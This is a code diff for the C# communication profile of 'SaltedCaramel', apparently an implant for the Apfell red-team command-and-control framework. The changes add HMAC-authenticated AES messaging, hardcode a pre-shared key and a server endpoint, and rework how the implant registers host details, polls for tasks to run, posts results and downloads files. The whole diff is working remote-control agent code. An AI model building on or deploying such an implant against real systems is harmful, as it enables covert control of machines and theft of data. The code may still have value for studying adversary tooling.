@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using Apfell.C2Profiles;
@@ -11,7 +10,6 @@ using System.Diagnostics;
 using System.Security.Cryptography;
 using System.IO;
 using System.Net;
-using System.Threading;
 
 namespace Profiles
 {
@@ -27,15 +25,16 @@ namespace Profiles
         /// Profile.Crypto classes.
         /// </summary>
         private byte[] PSK = { 0x00 };
-
+        private byte[] uuid;
 
         /// <summary>
         /// Instantiate a DefaultEncryption class
         /// </summary>
         /// <param name="pskString">The Pre-Shared Key in b64 format.</param>
-        public DefaultEncryption(string pskString)
+        public DefaultEncryption(string uuidString, string pskString)
         {
             PSK = Convert.FromBase64String(pskString);
+            uuid = ASCIIEncoding.ASCII.GetBytes(uuidString);
         }
 
         /// <summary>
@@ -58,10 +57,16 @@ namespace Profiles
                 {
                     using (StreamWriter encryptStreamWriter = new StreamWriter(encryptCryptoStream))
                         encryptStreamWriter.Write(plaintext);
-                    // We need to send iv:ciphertext
+                    // We need to send uuid:iv:ciphertext:hmac
+                    // Concat iv:ciphertext
                     byte[] encrypted = scAes.IV.Concat(encryptMemStream.ToArray()).ToArray();
+                    HMACSHA256 sha256 = new HMACSHA256(PSK);
+                    // Attach hmac to iv:ciphertext
+                    byte[] hmac = sha256.ComputeHash(encrypted);
+                    // Attach uuid to iv:ciphertext:hmac
+                    byte[] final = uuid.Concat(encrypted.Concat(hmac).ToArray()).ToArray();
                     // Return base64 encoded ciphertext
-                    return Convert.ToBase64String(encrypted);
+                    return Convert.ToBase64String(final);
                 }
             }
         }
@@ -75,39 +80,52 @@ namespace Profiles
         {
             byte[] input = Convert.FromBase64String(encrypted);
 
-            // Input is IV:ciphertext, IV is 16 bytes
+            int uuidLength = uuid.Length;
+            // Input is uuid:iv:ciphertext:hmac, IV is 16 bytes
+            byte[] uuidInput = new byte[uuidLength];
+            Array.Copy(input, uuidInput, uuidLength);
+            
             byte[] IV = new byte[16];
-            byte[] ciphertext = new byte[input.Length - 16];
-            Array.Copy(input, IV, 16);
-            Array.Copy(input, 16, ciphertext, 0, ciphertext.Length);
+            Array.Copy(input, uuidLength, IV, 0, 16);
 
-            using (Aes scAes = Aes.Create())
+            byte[] ciphertext = new byte[input.Length - uuidLength - 16 - 32];
+            Array.Copy(input, uuidLength + 16, ciphertext, 0, ciphertext.Length);
+
+            HMACSHA256 sha256 = new HMACSHA256(PSK);
+            byte[] hmac = new byte[32];
+            Array.Copy(input, uuidLength + 16 + ciphertext.Length, hmac, 0, 32);
+
+            if (Convert.ToBase64String(hmac) == Convert.ToBase64String(sha256.ComputeHash(IV.Concat(ciphertext).ToArray())))
             {
-                // Use our PSK (generated in Apfell payload config) as the AES key
-                scAes.Key = PSK;
-
-                ICryptoTransform decryptor = scAes.CreateDecryptor(scAes.Key, IV);
-
-                using (MemoryStream decryptMemStream = new MemoryStream(ciphertext))
-                using (CryptoStream decryptCryptoStream = new CryptoStream(decryptMemStream, decryptor, CryptoStreamMode.Read))
-                using (StreamReader decryptStreamReader = new StreamReader(decryptCryptoStream))
+                using (Aes scAes = Aes.Create())
                 {
-                    string decrypted = decryptStreamReader.ReadToEnd();
-                    // Return decrypted message from Apfell server
-                    return decrypted;
+                    // Use our PSK (generated in Apfell payload config) as the AES key
+                    scAes.Key = PSK;
+
+                    ICryptoTransform decryptor = scAes.CreateDecryptor(scAes.Key, IV);
+
+                    using (MemoryStream decryptMemStream = new MemoryStream(ciphertext))
+                    using (CryptoStream decryptCryptoStream = new CryptoStream(decryptMemStream, decryptor, CryptoStreamMode.Read))
+                    using (StreamReader decryptStreamReader = new StreamReader(decryptCryptoStream))
+                    {
+                        string decrypted = decryptStreamReader.ReadToEnd();
+                        // Return decrypted message from Apfell server
+                        return decrypted;
+                    }
                 }
+            }
+            else
+            {
+                throw new Exception("WARNING: HMAC did not match message!");
             }
         }
     }
+
     class DefaultProfile : C2Profile
     {
-        private static Crypto cryptor = new DefaultEncryption("B64_PSK_HERE");
+        private static Crypto cryptor;
         private static WebClient client;
-        private const string RootURL = "https://apfell_server/api/v1.3/";
-        private static string InitializationEndpoint = RootURL + "crypto/aes_psk/{}";
-        private static string TaskEndpoint = RootURL + "tasks/callback/{}/nextTask";
-        private static string FileEndpoint = RootURL + "files/callback/{}";
-
+        private const string Endpoint = "https://192.168.38.192/api/v1.4/agent_message";
 
         // Almost certainly need to pass arguments here to deal with proxy nonsense.
         public DefaultProfile()
@@ -118,27 +136,27 @@ namespace Profiles
             client = new WebClient();
         }
 
-        private static string Get(string endpoint)
+        // Make a request to the Apfell endpoint and decrypt the result
+        private static string Get(string message)
         {
-            return cryptor.Decrypt(client.DownloadString(endpoint));
+            return cryptor.Decrypt(client.DownloadString($"{Endpoint}/{message}"));
         }
 
-
-
-        private static string Post(string endpoint, string message)
+        // Encrypt and post a string to the Apfell server
+        private static string Post(string message)
         {
             byte[] reqPayload = Encoding.UTF8.GetBytes(cryptor.Encrypt(message));
 
-            return cryptor.Decrypt(Encoding.UTF8.GetString(client.UploadData(endpoint, reqPayload)));
+            return cryptor.Decrypt(Encoding.UTF8.GetString(client.UploadData(Endpoint, reqPayload)));
         }
+
         override public string PostResponse(SCTaskResp taskresp)
         {
-            string endpoint = RootURL + "responses/" + taskresp.id;
             try // Try block for HTTP requests
             {
                 // Encrypt json to send to server
                 string json = JsonConvert.SerializeObject(taskresp);
-                string result = Post(endpoint, json);
+                string result = Post(json);
                 Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.id}: {result}");
                 if (result.Contains("success"))
                     // If it was successful, return the result
@@ -149,18 +167,16 @@ namespace Profiles
             {
                 return e.Message;
             }
-
         }
 
         override public string RegisterAgent(SaltedCaramel.SCImplant agent)
         {
-            string initEndpoint = String.Format(InitializationEndpoint, agent.UUID);
+            cryptor = new DefaultEncryption(agent.uuid, "jttjS4WjhCZRWusOsM57ddUOT4f/CMurAFwD5sjmUhU=");
             // Get JSON string for implant
-            // Format: {"user":"username", "host":"hostname", "pid":<pid>, "ip":<ip>, "uuid":<uuid>}
             string json = JsonConvert.SerializeObject(agent);
-            Debug.WriteLine($"[+] InitializeImplant - Sending {json} to {initEndpoint}");
+            Debug.WriteLine($"[+] InitializeImplant - Sending {json}");
 
-            string result = Post(initEndpoint, json);
+            string result = Post(json);
 
             if (result.Contains("success"))
             {
@@ -181,8 +197,11 @@ namespace Profiles
         /// <returns>CaramelTask with the next task to execute</returns>
         override public SCTask CheckTasking(SaltedCaramel.SCImplant agent)
         {
-            string taskEndpoint = String.Format(TaskEndpoint, agent.CallbackID);
-            SCTask task = JsonConvert.DeserializeObject<SCTask>(Get(taskEndpoint));
+            string json = "{";
+            json += "\"action\":\"get_tasking\",";
+            json += "\"tasking_size\":1,";
+            json += "}";
+            SCTask task = JsonConvert.DeserializeObject<SCTask>(Get(json));
             if (task.command != "none")
                 Debug.WriteLine("[-] CheckTasking - NEW TASK with ID: " + task.id);
             return task;
@@ -191,12 +210,11 @@ namespace Profiles
         override public byte[] GetFile(string file_id, SaltedCaramel.SCImplant implant)
         {
             byte[] bytes;
-            string fileEndpoint = String.Format(FileEndpoint, implant.CallbackID);
             try
             {
                 string payload = "{\"file_id\": \"" + file_id + "\"}";
                 // Get response from server and decrypt
-                string result = Post(fileEndpoint, payload);
+                string result = Post(payload);
                 bytes = Convert.FromBase64String(result);
                 return bytes;
             }
